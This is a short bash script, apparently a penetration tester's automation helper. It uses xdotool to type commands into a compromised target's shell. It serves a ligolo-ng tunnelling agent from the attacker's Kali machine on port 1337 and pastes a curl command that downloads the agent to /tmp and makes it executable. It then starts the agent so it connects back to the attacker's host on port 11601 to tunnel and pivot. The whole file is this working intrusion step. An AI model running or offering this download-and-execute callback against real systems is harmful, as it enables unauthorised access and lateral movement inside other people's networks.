#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd /opt/tools/ligolo-ng_agent_*_linux_amd64
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "curl http://${KALI_IP}:1337/agent -o /tmp/agent && chmod +x /tmp/agent && cd /tmp && ls -alF /tmp"
xdotool key Return
sleep 0.8

kill $HTTP_PID

paste_command "./agent -connect ${KALI_IP}:11601 -ignore-cert"
xdotool key Return
sleep 0.8